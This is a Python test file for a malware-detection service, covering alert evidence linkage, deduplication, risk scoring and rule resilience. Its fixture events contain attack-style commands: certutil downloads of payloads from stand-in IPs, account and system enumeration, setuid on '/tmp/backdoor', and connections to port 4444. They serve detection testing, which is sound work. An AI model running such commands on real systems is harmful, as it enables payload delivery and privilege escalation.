"""Regression tests for correlation, detection correctness, explainability,
evidence linkage, and alert deduplication without evidence loss (Milestone 4).
"""

from datetime import datetime, timedelta, timezone

from ..core.db import db_session
from ..services import detection
from ..services.risk import compute_risk_score, recalculate_run_risk, rule_confidence
from .conftest import make_run


def _ts(offset_seconds: int = 0) -> str:
    return (
        datetime(2026, 9, 10, 10, 0, 0, tzinfo=timezone.utc)
        + timedelta(seconds=offset_seconds)
    ).isoformat()


def test_single_event_evidence_linkage(client):
    """Single-event detections link directly to the triggering event ID and record rule condition."""
    rid = make_run(client, sample_name="det-single-ev")
    ev = {
        "run_id": rid,
        "platform": "windows",
        "event_type": "process_create",
        "timestamp": _ts(0),
        "pid": 5010,
        "ppid": 1000,
        "process_name": "certutil.exe",
        "exe_path": "C:\\Windows\\System32\\certutil.exe",
        "command_line": "certutil.exe -urlcache -split -f http://198.51.100.221/mal.exe",
    }
    resp = client.post("/ingest/batch", json=[ev])
    assert resp.status_code == 202

    findings_resp = client.get("/findings", params={"rule_id": "lolbin-abuse"})
    assert findings_resp.status_code == 200
    alerts = [a for a in findings_resp.json()["alerts"] if a["run_id"] == rid]
    assert len(alerts) == 1
    alert = alerts[0]

    assert alert["rule_id"] == "lolbin-abuse"
    assert alert["severity"] == "malicious"
    assert alert["confidence"] is None
    assert rule_confidence(alert["rule_id"]) == "high"
    assert len(alert["evidence_event_ids"]) == 1
    assert alert["occurrence_count"] == 1

    ev_resp = client.get(f"/findings/{alert['id']}/evidence")
    assert ev_resp.status_code == 200
    ev_data = ev_resp.json()
    assert ev_data["finding_id"] == alert["id"]
    assert len(ev_data["events"]) == 1
    assert "certutil" in ev_data["events"][0]["command_line"]

    with db_session() as conn:
        join_rows = conn.execute(
            "SELECT * FROM finding_evidence_events WHERE finding_id = ?",
            (alert["id"],),
        ).fetchall()
        assert len(join_rows) == 1
        assert join_rows[0]["event_id"] == alert["evidence_event_ids"][0]


def test_composite_rule_evidence_linkage(client):
    """Composite rules (e.g. enumeration burst) link all contributing events to the finding."""
    rid = make_run(client, sample_name="det-composite-ev")
    cmds = [
        "whoami /all",
        "net user administrator",
        "systeminfo",
        "ipconfig /all",
        "net localgroup administrators",
    ]
    events = [
        {
            "run_id": rid,
            "platform": "windows",
            "event_type": "process_create",
            "timestamp": _ts(i * 2),
            "pid": 6000 + i,
            "process_name": "cmd.exe",
            "command_line": cmd,
        }
        for i, cmd in enumerate(cmds)
    ]
    resp = client.post("/ingest/batch", json=events)
    assert resp.status_code == 202

    findings_resp = client.get("/findings", params={"rule_id": "enumeration-burst"})
    assert findings_resp.status_code == 200
    alerts = [a for a in findings_resp.json()["alerts"] if a["run_id"] == rid]
    assert len(alerts) == 1
    alert = alerts[0]

    assert alert["rule_id"] == "enumeration-burst"
    assert len(alert["evidence_event_ids"]) >= 5
    assert alert["confidence"] == "medium"

    ev_resp = client.get(f"/findings/{alert['id']}/evidence")
    assert ev_resp.status_code == 200
    assert len(ev_resp.json()["events"]) >= 5


def test_alert_deduplication_preserves_new_evidence(client):
    """Repeated alerts for the same entity deduplicate into one finding without losing supporting event IDs."""
    rid = make_run(client, sample_name="det-dedup-ev")
    # First triggering event
    ev1 = {
        "run_id": rid,
        "platform": "windows",
        "event_type": "process_create",
        "timestamp": _ts(0),
        "process_start_time": _ts(0),
        "pid": 7010,
        "process_name": "certutil.exe",
        "exe_path": "C:\\Windows\\System32\\certutil.exe",
        "command_line": "certutil.exe -urlcache -f http://198.51.100.222/stage1.bin",
    }
    r1 = client.post("/ingest/batch", json=[ev1])
    assert r1.status_code == 202

    # Second triggering event for same process entity
    ev2 = {
        "run_id": rid,
        "platform": "windows",
        "event_type": "process_create",
        "timestamp": _ts(10),
        "process_start_time": _ts(0),
        "pid": 7010,
        "process_name": "certutil.exe",
        "exe_path": "C:\\Windows\\System32\\certutil.exe",
        "command_line": "certutil.exe -urlcache -f http://198.51.100.222/stage2.bin",
    }
    r2 = client.post("/ingest/batch", json=[ev2])
    assert r2.status_code == 202

    findings_resp = client.get("/findings", params={"rule_id": "lolbin-abuse"})
    assert findings_resp.status_code == 200
    alerts = [a for a in findings_resp.json()["alerts"] if a["run_id"] == rid]
    # No duplicate alerts created
    assert len(alerts) == 1
    alert = alerts[0]

    # Occurrence counter incremented and both event IDs preserved!
    assert alert["occurrence_count"] == 2
    assert len(alert["evidence_event_ids"]) == 2

    ev_resp = client.get(f"/findings/{alert['id']}/evidence")
    assert ev_resp.status_code == 200
    assert len(ev_resp.json()["events"]) == 2
    cmds = [e["command_line"] for e in ev_resp.json()["events"]]
    assert any("stage1" in c for c in cmds)
    assert any("stage2" in c for c in cmds)


def test_severity_confidence_and_risk_disentangled(client):
    """Severity, confidence, and risk score represent distinct dimensions."""
    assert rule_confidence("masquerading") == "high"
    assert rule_confidence("unusual-port") == "medium"
    assert rule_confidence("first-seen-process") == "low"

    # Distinct rules accumulate in run risk score
    score = compute_risk_score(["masquerading", "unusual-port"])
    # 20 (masquerading) + 10 (unusual-port) = 30
    assert score == 30


def test_detection_reproducibility_from_stored_events(client):
    """Detections can be deterministically reproduced from stored event data."""
    rid = make_run(client, sample_name="det-repro-ev")
    events = [
        {
            "run_id": rid,
            "platform": "linux",
            "event_type": "process_create",
            "timestamp": _ts(0),
            "pid": 8010,
            "process_name": "chmod",
            "command_line": "chmod u+s /tmp/backdoor",
        },
        {
            "run_id": rid,
            "platform": "linux",
            "event_type": "network_connection",
            "timestamp": _ts(5),
            "pid": 8011,
            "dest_ip": "198.51.100.223",
            "dest_port": 4444,
            "protocol": "tcp",
        },
    ]
    r = client.post("/ingest/batch", json=events)
    assert r.status_code == 202

    # Dry-run recalculation
    repro_dry = client.post(f"/runs/{rid}/recalculate-detections?sync=false")
    assert repro_dry.status_code == 200
    data_dry = repro_dry.json()
    assert data_dry["events_scanned"] == 2
    assert data_dry["reproduced_findings_count"] >= 2
    assert data_dry["synced"] is False

    # Synchronized recalculation
    repro_sync = client.post(f"/runs/{rid}/recalculate-detections?sync=true")
    assert repro_sync.status_code == 200
    data_sync = repro_sync.json()
    assert data_sync["synced"] is True
    assert data_sync["risk_score"] > 0


def test_risk_score_recalculation_on_triage(client):
    """Recalculating run risk excludes false-positive findings."""
    rid = make_run(client, sample_name="det-risk-triage")
    ev1 = {
        "run_id": rid,
        "platform": "linux",
        "event_type": "process_create",
        "timestamp": _ts(0),
        "pid": 9010,
        "process_name": "chmod",
        "command_line": "chmod u+s /tmp/escalate",
    }
    ev2 = {
        "run_id": rid,
        "platform": "linux",
        "event_type": "network_connection",
        "timestamp": _ts(5),
        "pid": 9011,
        "dest_ip": "198.51.100.224",
        "dest_port": 4444,
        "protocol": "tcp",
    }
    client.post("/ingest/batch", json=[ev1, ev2])

    with db_session() as conn:
        initial_score = recalculate_run_risk(conn, rid)
        assert initial_score > 0

        # Mark one finding as false-positive
        conn.execute(
            "UPDATE alerts SET disposition = 'false-positive' WHERE run_id = ? AND rule_id = 'suid-set'",
            (rid,),
        )
        new_score = recalculate_run_risk(conn, rid)
        # suid-set (weight 18) was removed from threat score
        assert new_score < initial_score


def test_missing_fields_and_malformed_events_resilience(client):
    """Detection rules survive missing fields and malformed timestamps safely."""
    # Empty dict or missing keys should not crash
    assert detection.check_masquerading({}) is None
    assert detection.check_lolbin_abuse({}) is None
    assert detection.check_credential_dump({}) is None
    assert detection.check_unusual_port({}) is None
    assert detection.check_suid_set({}) is None
    assert detection.check_remote_thread_injection({}) is None

    # Timestamp parser resilience
    assert detection._parse_ts(None) is None
    assert detection._parse_ts("invalid-date-string") is None
    assert detection._parse_ts(1700000000) is not None
    dt_naive = datetime(2026, 9, 10, 12, 0, 0)
    parsed = detection._parse_ts(dt_naive)
    assert parsed.tzinfo == timezone.utc

    # Comparing naive and aware parsed times must not raise TypeError
    cutoff = detection._window_cutoff([{"timestamp": "2026-09-10T12:00:00"}], 60)
    assert cutoff.tzinfo == timezone.utc


def test_out_of_order_event_arrival_window(client):
    """Window anchoring survives out-of-order batches without shrinking."""
    batch_t2 = [{"timestamp": "2026-09-10T12:05:00Z"}]
    batch_t1 = [{"timestamp": "2026-09-10T12:01:00Z"}]

    c1 = detection._window_cutoff(batch_t1, 120)
    assert c1.minute == 59  # 12:01 - 2m = 11:59

    c2 = detection._window_cutoff(batch_t2, 120)
    assert c2.minute == 3  # 12:05 - 2m = 12:03

    # Mixed out-of-order in single list
    mixed = [{"timestamp": "2026-09-10T12:05:00Z"}, {"timestamp": "2026-09-10T12:01:00Z"}]
    c_mixed = detection._window_cutoff(mixed, 120)
    assert c_mixed.minute == 3  # anchored to 12:05
